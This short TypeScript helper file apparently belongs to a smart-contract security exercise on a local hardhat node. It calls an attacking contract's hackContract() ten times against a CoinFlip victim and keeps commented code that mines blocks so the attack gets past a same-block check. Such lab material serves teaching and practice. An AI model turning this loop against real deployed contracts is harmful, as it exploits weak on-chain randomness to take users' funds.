const helper = async (victim: any, attacker: any) => {
  // We attack the contract 10 times in a row, in a for loop,
  // from our AttackingCoinFlip contract.

  // The attack is possible this way since, by default,
  // hardhat node is set to automine a block after each tx.

  // Otherwise, in order to bypass the check
  // at CoinFlip.sol:17, we need to uncomment the code below,
  // which manually mines a block after each attack tx.

  for (let i = 0; i < 10; i++) {
    await attacker.hackContract();

    // const hardhat = require("hardhat");
    // await hardhat.network.provider.request({
    //   method: "evm_mine",
    //   params: [],
    // });
  }
};

export default helper;
